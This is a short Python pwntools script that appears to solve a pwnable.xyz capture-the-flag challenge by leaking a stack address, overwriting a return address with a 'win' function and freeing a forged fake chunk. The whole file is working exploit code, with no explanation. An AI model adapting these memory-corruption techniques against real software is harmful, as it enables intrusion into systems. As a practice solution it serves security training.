from pwn import *

###Util
def edit(data):
    r.sendafter('> ','1'.ljust(0x30,'\x00'))
    r.send(data)

def show():
    r.sendlineafter('> ','2')
    return int(r.recvline()[2:-1],16)

def copy():
    r.sendlineafter('> ','3')

###Addr
win = 0x400a3e

###Exploit
r = remote('svc.pwnable.xyz',30005)
stack = show()
###Hijack pointer
edit(b'a'*0x8+p64(stack+0x58))
copy()
###Overwrite ret addr+hijack ptr to fake chunk
edit(p64(win)+p64(stack+0x20))
copy()
###Free fake chunk+ret
r.sendlineafter('> ',b'0'.ljust(0x10,b'\x00')+p64(0x31))

r.interactive()
